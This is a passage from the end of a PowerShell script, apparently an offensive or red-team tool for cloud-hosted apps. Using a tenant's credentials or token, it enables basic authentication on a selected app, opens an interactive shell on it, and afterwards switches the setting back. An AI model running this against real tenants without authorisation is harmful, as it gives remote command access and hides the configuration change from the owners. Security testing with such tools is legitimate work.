                    Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
                }
                continue
            }
    
            # Start shell
            Start-InteractiveShell -App $selectedApp -Creds $creds
    
            # Cleanup: disable basic auth
            Write-Host "`n  [*] Disconnecting from $($selectedApp.Name)..." -ForegroundColor Cyan
            if (-not $wasBasicAuthEnabled) {
                Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
            }
            else{
                 Write-Host "  [*] Basic Auth was already on - leaving as-is" -ForegroundColor DarkGray
            }
            Write-Host ""
        }
    }
 
main -TenantName $TenantName -ClientID $ClientID -ClientSecret $ClientSecret -Identity $Identity -AccessToken $AccessToken
 
}
 
